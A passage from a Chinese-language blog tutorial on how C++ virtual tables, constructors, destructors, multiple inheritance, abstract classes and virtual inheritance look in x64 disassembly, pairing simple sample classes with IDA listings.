retn</span><br></pre></td></tr></table></figure><p>析构函数会再次给类首部赋值虚表指针，让其指向自身的虚表首地址，</p><p>子类以后可能会被其他类继承成为父类,子类执行完析构函数执行父类的析构，此时this指针处虚表是子类的，如果不修改虚表就会执行到子类析构</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000140001570   ; void __fastcall Person::~Person(Person *this)</span><br><span class="line">.text:0000000140001570   ??1Person@@QEAA@XZ proc near            ; CODE XREF: Person::~Person(void)↑j</span><br><span class="line">.text:0000000140001570                                           ; DATA XREF: .pdata:ExceptionDir↓o</span><br><span class="line">.text:0000000140001570</span><br><span class="line">.text:0000000140001570   arg_0= qword ptr  8</span><br><span class="line">.text:0000000140001570</span><br><span class="line">.text:0000000140001570   mov     [rsp+arg_0], rcx</span><br><span class="line">.text:0000000140001575   sub     rsp, 28h</span><br><span class="line">.text:0000000140001579   mov     rax, [rsp+28h+arg_0]</span><br><span class="line">.text:000000014000157E   lea     rcx, ??_7Person@@6B@            ; const Person::`vftable&#x27;</span><br><span class="line">.text:0000000140001585   mov     [rax], rcx</span><br><span class="line">.text:0000000140001588   lea     rcx, _Format                    ; &quot;~Person()\n&quot;</span><br><span class="line">.text:000000014000158F   call    j_printf</span><br><span class="line">.text:000000014000158F</span><br><span class="line">.text:0000000140001594   add     rsp, 28h</span><br><span class="line">.text:0000000140001598   retn</span><br></pre></td></tr></table></figure><p>同时可以发现直接使用对象调用自身虚函数时，被编译成直接call虚函数，不走虚表，效率高</p><p>通过指针或者引用(引用只是在编译期间多了检测的指针)调用虚函数是从虚表取出虚函数指针再调用</p><h2 id="类与父类之间关系"><a href="#类与父类之间关系" class="headerlink" title="类与父类之间关系"></a>类与父类之间关系</h2><p>在内存中的数据排列：先安排父类的数据，后安排子类新定义的数据。父类中声明为私有（private）的成员，子类对象无法直接访问，但是在子类对象的内存结构中，父类私有的成员数据依然存在。C++语法规定的访问控制仅限于编译层面，在编译的过程中由编译器进行语法检查</p><blockquote><p>父类数据在前面方便了使用父类函数，直接传递子类this指针即可</p></blockquote><p>对于子类无构造析构函数，父类有构造和析构函数，子类会提供默认构造和析构函数</p><p>构造：基类→基类的派生类→……→当前类。<br>析构：当前类→基类的派生类→……→基类。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span>    <span class="comment">// 基类—&quot; 人 &quot; 类</span></span><br><span class="line">public:</span><br><span class="line">  Person() &#123;</span><br><span class="line">    showSpeak();</span><br><span class="line">  &#125;</span><br><span class="line">  virtual ~Person() &#123;</span><br><span class="line">    showSpeak();</span><br><span class="line">  &#125;</span><br><span class="line">  virtual <span class="type">void</span> <span class="title function_">showSpeak</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Speak Person\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chinese</span> :</span> public Person &#123;    <span class="comment">// 中国人：继承自人类</span></span><br><span class="line">public:</span><br><span class="line">  Chinese() &#123;&#125;</span><br><span class="line">  virtual ~Chinese() &#123;&#125;</span><br><span class="line">  virtual <span class="type">void</span> <span class="title function_">showSpeak</span><span class="params">()</span> &#123;    <span class="comment">// 覆盖基类虚函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Speak Chinese\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">American</span> :</span> public Person &#123; <span class="comment">//美国人：继承自人类</span></span><br><span class="line">public:</span><br><span class="line">  American() &#123;&#125;</span><br><span class="line">  virtual ~American() &#123;&#125;</span><br><span class="line">  virtual <span class="type">void</span> <span class="title function_">showSpeak</span><span class="params">()</span> &#123; <span class="comment">//覆盖基类虚函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Speak American\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">German</span> :</span> public Person &#123; <span class="comment">//德国人：继承自人类</span></span><br><span class="line">public:</span><br><span class="line">  German() &#123;&#125;</span><br><span class="line">  virtual ~German() &#123;&#125;</span><br><span class="line">  virtual <span class="type">void</span> <span class="title function_">showSpeak</span><span class="params">()</span> &#123; <span class="comment">//覆盖基类虚函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Speak German\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">speak</span><span class="params">(Person* person)</span> &#123; <span class="comment">//根据虚表信息获取虚函数首地址并调用</span></span><br><span class="line">  person-&gt;showSpeak();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  Chinese chinese;</span><br><span class="line">  American american;</span><br><span class="line">  German german;</span><br><span class="line">  speak(&amp;chinese);</span><br><span class="line">  speak(&amp;american);</span><br><span class="line">  speak(&amp;german);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子类会按照父类虚函数定义的顺序排列属于自己的虚表</p><p><img src="/2023/10/26/Cpp-disassemble-1/image-20231026094850173.png" alt="image-20231026094850173"></p><p>调用构造或析构函数第一步都是将虚表指针换为该类的虚表指针，来调用到属于自己的函数</p><blockquote><p>析构函数没有被定义为虚函数，那么编译器会按指针的类型调用父类的析构函数，从而引发错误</p></blockquote><p>显式调用析构函数时不能马上释放堆内存，所以在析构函数的代理函数中通过一个参数控制是否释放内存，便于程序员管理析构函数的调用。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;new.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span>    <span class="comment">// 基类—&quot; 人 &quot; 类</span></span><br><span class="line">public:</span><br><span class="line">  Person() &#123;&#125;</span><br><span class="line">  virtual ~Person() &#123;&#125;</span><br><span class="line">  virtual <span class="type">void</span> <span class="title function_">showSpeak</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chinese</span> :</span> public Person &#123;    <span class="comment">// 中国人：继承自人类</span></span><br><span class="line">public:</span><br><span class="line">  Chinese() &#123;&#125;</span><br><span class="line">  virtual ~Chinese() &#123;&#125;</span><br><span class="line">  virtual <span class="type">void</span> <span class="title function_">showSpeak</span><span class="params">()</span> &#123;    <span class="comment">// 覆盖基类虚函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Speak Chinese\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  Person* p = new Chinese;</span><br><span class="line">  p-&gt;~Person(); <span class="comment">//显式调用析构函数</span></span><br><span class="line">  <span class="comment">//将堆内存中p指向的地址作为Chinese的新对象的首地址，并调用Chinese的构造函数。这</span></span><br><span class="line">  <span class="comment">//样可以重复使用同一个堆内存，以节约内存空间</span></span><br><span class="line">  p = new (p) Chinese();</span><br><span class="line">  delete p;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22:   p-&gt;~Person(); //显式调用析构函数</span><br><span class="line">0000000140001772  mov         rax,qword ptr [p] ;rax=对象地址</span><br><span class="line">0000000140001777  mov         rax,qword ptr [rax]  ;rax=虚表指针</span><br><span class="line">000000014000177A  xor         edx,edx  ;参数0只调用析构函数不释放</span><br><span class="line">000000014000177C  mov         rcx,qword ptr [p] ;this指针</span><br><span class="line">0000000140001781  call        qword ptr [rax]  ;虚表第一项:代理析构函数</span><br><span class="line">    23:   //将堆内存中p指向的地址作为Chinese的新对象的首地址，并调用Chinese的构造函数。这</span><br><span class="line">    24:   //样可以重复使用同一个堆内存，以节约内存空间</span><br><span class="line">    25:   p = new (p) Chinese();</span><br><span class="line">0000000140001783  mov         rdx,qword ptr [p]  </span><br><span class="line">0000000140001788  mov         ecx,8  </span><br><span class="line">000000014000178D  call        operator new (0140001203h)  </span><br><span class="line">0000000140001792  mov         qword ptr [rsp+48h],rax  </span><br><span class="line">0000000140001797  mov         rcx,qword ptr [rsp+48h];this指针  </span><br><span class="line">000000014000179C  call        Chinese::Chinese (01400011CCh)  </span><br><span class="line">00000001400017A1  mov         qword ptr [p],rax </span><br></pre></td></tr></table></figure><p><code>000000014000178D  call        operator new (0140001203h)</code>  这里new也不是完整的new</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   167:         _Writable_bytes_(_Size) void* _Where) noexcept</span><br><span class="line">   168:     &#123;</span><br><span class="line">00000001400015C0 48 89 54 24 10       mov         qword ptr [rsp+10h],rdx  </span><br><span class="line">00000001400015C5 48 89 4C 24 08       mov         qword ptr [rsp+8],rcx  </span><br><span class="line">   169:         (void)_Size;</span><br><span class="line">   170:         return _Where;</span><br><span class="line">00000001400015CA 48 8B 44 24 10       mov         rax,qword ptr [rsp+10h]  </span><br><span class="line">   171:     &#125;</span><br></pre></td></tr></table></figure><p>直接把堆返回回来了</p><h2 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sofa</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  Sofa() &#123;</span><br><span class="line">    color = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual ~Sofa() &#123;    <span class="comment">// 沙发类虚析构函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;virtual ~Sofa()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">getColor</span><span class="params">()</span> &#123;    <span class="comment">// 获取沙发颜色</span></span><br><span class="line">    <span class="keyword">return</span> color;</span><br><span class="line">  &#125;</span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">sitDown</span><span class="params">()</span> &#123;    <span class="comment">// 沙发可以坐下休息</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Sit down and rest your legs\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">protected:</span><br><span class="line">  <span class="type">int</span> color;    <span class="comment">// 沙发类成员变量</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义床类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bed</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  Bed() &#123;</span><br><span class="line">    length = <span class="number">4</span>;</span><br><span class="line">    width = <span class="number">5</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual ~Bed() &#123;  <span class="comment">//床类虚析构函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;virtual ~Bed()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">getArea</span><span class="params">()</span> &#123; <span class="comment">//获取床面积</span></span><br><span class="line">    <span class="keyword">return</span> length * width;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">sleep</span><span class="params">()</span> &#123;  <span class="comment">//床可以用来睡觉</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;go to sleep\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">protected:</span><br><span class="line">  <span class="type">int</span> length;    <span class="comment">//床类成员变量</span></span><br><span class="line">  <span class="type">int</span> width;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类沙发床定义，派生自 Sofa 类和 Bed 类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SofaBed</span> :</span> public Sofa, public Bed &#123;</span><br><span class="line">public:</span><br><span class="line">  SofaBed() &#123;</span><br><span class="line">    height = <span class="number">6</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual ~SofaBed() &#123;    <span class="comment">//沙发床类的虚析构函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;virtual ~SofaBed()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">sitDown</span><span class="params">()</span> &#123;    <span class="comment">//沙发可以坐下休息</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Sit down on the sofa bed\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">sleep</span><span class="params">()</span> &#123;    <span class="comment">//床可以用来睡觉</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;go to sleep on the sofa bed\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> height;</span><br><span class="line">  &#125;</span><br><span class="line">protected:</span><br><span class="line">  <span class="type">int</span> height;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  SofaBed sofabed;</span><br><span class="line">  Sofa* sofa = &amp;sofabed;</span><br><span class="line">  Bed* bed = &amp;sofabed;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数据成员的排列顺序由继承父类的顺序决定，从左向右依次排列。</p><p>子类中实现的虚函数会在虚表里替换，没实现的依旧是父类虚函数</p><p><img src="/2023/10/26/Cpp-disassemble-1/image-20231026120014414.png" alt="image-20231026120014414"></p><blockquote><p>vs2022里的监视窗口不是真实内存布局，只不过这次凑巧一样,还是要从内存窗口看</p></blockquote><p>构造函数会把this指针调整到各个父类部分，调用父类的构造函数，然后再把SofaBed的虚表指针赋值到各个父类部分</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000140001620    ; __unwind &#123; // __CxxFrameHandler4_0</span><br><span class="line">.text:0000000140001620    mov     [rsp+arg_0], rcx</span><br><span class="line">.text:0000000140001625    sub     rsp, 28h</span><br><span class="line">.text:0000000140001629    mov     rcx, [rsp+28h+arg_0]            ; this</span><br><span class="line">.text:000000014000162E    call    j_??0Sofa@@QEAA@XZ              ; Sofa::Sofa(void)</span><br><span class="line">.text:000000014000162E</span><br><span class="line">.text:0000000140001633    nop</span><br><span class="line">.text:0000000140001634    mov     rax, [rsp+28h+arg_0]</span><br><span class="line">.text:0000000140001639    add     rax, 10h                        ;调整到Bed this位置</span><br><span class="line">.text:000000014000163D    mov     rcx, rax                        ; this</span><br><span class="line">.text:0000000140001640    call    j_??0Bed@@QEAA@XZ               ; Bed::Bed(void)</span><br><span class="line">.text:0000000140001640</span><br><span class="line">.text:0000000140001645    mov     rax, [rsp+28h+arg_0]</span><br><span class="line">.text:000000014000164A    lea     rcx, ??_7SofaBed@@6BSofa@@@     ; const SofaBed::`vftable&#x27;&#123;for `Sofa&#x27;&#125;</span><br><span class="line">.text:0000000140001651    mov     [rax], rcx</span><br><span class="line">.text:0000000140001654    mov     rax, [rsp+28h+arg_0]</span><br><span class="line">.text:0000000140001659    lea     rcx, ??_7SofaBed@@6BBed@@@      ; const SofaBed::`vftable&#x27;&#123;for `Bed&#x27;&#125;</span><br><span class="line">.text:0000000140001660    mov     [rax+10h], rcx</span><br><span class="line">.text:0000000140001664    mov     rax, [rsp+28h+arg_0]</span><br><span class="line">.text:0000000140001669    mov     dword ptr [rax+20h], 6</span><br><span class="line">.text:0000000140001670    mov     rax, [rsp+28h+arg_0]</span><br><span class="line">.text:0000000140001675    add     rsp, 28h</span><br><span class="line">.text:0000000140001679    retn</span><br><span class="line">.text:0000000140001679    ; &#125; // starts at 140001620</span><br></pre></td></tr></table></figure><p>析构函数也是一样套路，不过是先把SofaBed的虚表指针赋值到各个父类部分调用析构函数，在把this指针调整到各个父类部分，调用父类的构造函数</p><p>指针赋值也是一样的套路</p><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AbstractBase</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  AbstractBase() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AbstractBase()&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  virtual <span class="type">void</span> <span class="title function_">show</span><span class="params">()</span> = <span class="number">0</span>;    <span class="comment">//定义纯虚函数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VirtualChild</span> :</span> public AbstractBase &#123;    <span class="comment">//定义继承抽象类的子类</span></span><br><span class="line">public:</span><br><span class="line">  virtual <span class="type">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;    <span class="comment">//实现纯虚函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;抽象类分析\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  VirtualChild obj;</span><br><span class="line">  obj.show();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>纯虚函数的虚表项为_purecall_0，是编译器保证未定义的纯虚函数被调用提供的用于结束程序的函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.rdata:<span class="number">0000000140007B</span>B8 DE <span class="number">15</span> <span class="number">00</span> <span class="number">40</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>+??_7AbstractBase@@<span class="number">6B</span>@ dq offset _purecall_0, <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="虚继承-菱形继承"><a href="#虚继承-菱形继承" class="headerlink" title="虚继承(菱形继承)"></a>虚继承(菱形继承)</h2><p><img src="/2023/10/26/Cpp-disassemble-1/image-20231026123306196.png" alt="image-20231026123306196"></p><p>从这位大哥:<a href="https://lonelyenderman.top/archives/723">https://lonelyenderman.top/archives/723</a> 偷来的图，感觉比较有意思</p><p>羊和驼都继承了动物的类成员，当羊驼想要使用时，会产生数据冗余和二义性，引出了虚继承</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义家具类，虚基类，等同于类 羊驼</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Furniture</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  Furniture() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Furniture::Furniture()\n&quot;</span>);</span><br><span class="line">    price = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  virtual ~Furniture() &#123;    <span class="comment">//家具类的虚析构函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Furniture::~Furniture()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">getPrice</span><span class="params">()</span> &#123;    <span class="comment">//获取家具价格</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Furniture::getPrice()\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> price;</span><br><span class="line">  &#125;;</span><br><span class="line">protected:</span><br><span class="line">  <span class="type">int</span> price;    <span class="comment">//家具类的成员变量</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义沙发类，继承自类 Furniture，等同于类 羊</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sofa</span> :</span> virtual public Furniture &#123;</span><br><span class="line">public:</span><br><span class="line">  Sofa() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sofa::Sofa()\n&quot;</span>);</span><br><span class="line">    price = <span class="number">1</span>;</span><br><span class="line">    color = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  virtual ~Sofa() &#123;    <span class="comment">//沙发类虚析构函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sofa::~Sofa()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">getColor</span><span class="params">()</span> &#123;    <span class="comment">//获取沙发颜色</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sofa::getColor()\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> color;</span><br><span class="line">  &#125;</span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">sitDown</span><span class="params">()</span> &#123;    <span class="comment">//沙发可以坐下休息</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Sofa::sitDown()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">protected:</span><br><span class="line">  <span class="type">int</span> color;    <span class="comment">// 沙发类成员变量</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义床类，继承自类 Furniture，等同于类 驼</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bed</span> :</span> virtual public Furniture &#123;</span><br><span class="line">public:</span><br><span class="line">  Bed() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Bed::Bed()\n&quot;</span>);</span><br><span class="line">    price = <span class="number">3</span>;</span><br><span class="line">    length = <span class="number">4</span>;</span><br><span class="line">    width = <span class="number">5</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual ~Bed() &#123;    <span class="comment">//床类的虚析构函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Bed::~Bed()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">getArea</span><span class="params">()</span> &#123;    <span class="comment">//获取床面积</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Bed::getArea()\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> length * width;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">sleep</span><span class="params">()</span> &#123;    <span class="comment">//床可以用来睡觉</span></span><br><span class="line">    <span class="keyword">return</span>  <span class="built_in">printf</span>(<span class="string">&quot;Bed::sleep()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">protected:</span><br><span class="line">  <span class="type">int</span> length;    <span class="comment">//床类成员变量</span></span><br><span class="line">  <span class="type">int</span> width;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类沙发床的定义，派生自类 Sofa 和类 Bed，等同于类 羊驼</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SofaBed</span> :</span> public Sofa, public Bed &#123;</span><br><span class="line">public:</span><br><span class="line">  SofaBed() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SofaBed::SofaBed()\n&quot;</span>);</span><br><span class="line">    height = <span class="number">6</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  virtual ~SofaBed() &#123;    <span class="comment">//沙发床类的虚析构函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SofaBed::~SofaBed()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">sitDown</span><span class="params">()</span> &#123;    <span class="comment">//沙发可以坐下休息</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;SofaBed::sitDown()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">sleep</span><span class="params">()</span> &#123;    <span class="comment">//床可以用来睡觉</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;SofaBed::sleep()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SofaBed::getHeight()\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> height;</span><br><span class="line">  &#125;</span><br><span class="line">protected:</span><br><span class="line">  <span class="type">int</span> height;    <span class="comment">//沙发类的成员变量</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  SofaBed sofabed;</span><br><span class="line">  Furniture* p1 = &amp;sofabed;   <span class="comment">//转换成虚基类指针</span></span><br><span class="line">  Sofa* p2 = &amp;sofabed;        <span class="comment">//转换成父类指针</span></span><br><span class="line">  Bed* p3 = &amp;sofabed;         <span class="comment">//转换成父类指针</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p %p %p\n&quot;</span>, p1, p2, p3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sofabed内存布局"><a href="#sofabed内存布局" class="headerlink" title="sofabed内存布局"></a>sofabed内存布局</h3><p><img src="/2023/10/26/Cpp-disassemble-1/image-20231026124846358.png" alt="image-20231026124846358"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000140003550 ; __int64 __fastcall main(int argc, char **argv)</span><br><span class="line">.text:0000000140003550 main proc near                          ; CODE XREF: main_0↑j</span><br><span class="line">.text:0000000140003550                                         ; DATA XREF: .pdata:000000014000B390↓o</span><br><span class="line">.text:0000000140003550</span><br><span class="line">.text:0000000140003550 var_88= dword ptr -88h</span><br><span class="line">.text:0000000140003550 var_80= qword ptr -80h</span><br><span class="line">.text:0000000140003550 var_78= qword ptr -78h</span><br><span class="line">.text:0000000140003550 var_70= qword ptr -70h</span><br><span class="line">.text:0000000140003550 var_68= qword ptr -68h</span><br><span class="line">.text:0000000140003550 var_60= qword ptr -60h</span><br><span class="line">.text:0000000140003550 SofaBed= SofaBed ptr -58h</span><br><span class="line">.text:0000000140003550 arg_0= dword ptr  8</span><br><span class="line">.text:0000000140003550 arg_8= qword ptr  10h</span><br><span class="line">.text:0000000140003550</span><br><span class="line">.text:0000000140003550 mov     [rsp+arg_8], rdx</span><br><span class="line">.text:0000000140003555 mov     [rsp+arg_0], ecx</span><br><span class="line">.text:0000000140003559 sub     rsp, 0A8h</span><br><span class="line">.text:0000000140003560 mov     edx, 1                          ; 构造虚基类的标志：1构造，0不构造</span><br><span class="line">.text:0000000140003565 lea     rcx, [rsp+0A8h+SofaBed]         ; this</span><br><span class="line">.text:000000014000356A call    j_??0SofaBed@@QEAA@XZ           ; SofaBed::SofaBed(void)</span><br><span class="line">.text:000000014000356A</span><br><span class="line">.text:000000014000356F lea     rax, [rsp+50h]</span><br><span class="line">.text:0000000140003574 test    rax, rax</span><br><span class="line">.text:0000000140003577 jnz     short loc_140003584             </span><br><span class="line">.text:0000000140003577</span><br><span class="line">.text:0000000140003579 mov     [rsp+0A8h+var_80], 0</span><br><span class="line">.text:0000000140003582 jmp     short loc_140003597</span><br><span class="line">.text:0000000140003582</span><br><span class="line">.text:0000000140003584 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000140003584</span><br><span class="line">.text:0000000140003584 loc_140003584:                          ; CODE XREF: main+27↑j</span><br><span class="line">.text:0000000140003584 mov     rax, qword ptr [rsp+0A8h+SofaBed.baseclass_0.gap8] ; 取出对象Sofa虚基类偏移表</span><br><span class="line">.text:0000000140003589 movsxd  rax, dword ptr [rax+4]          ; 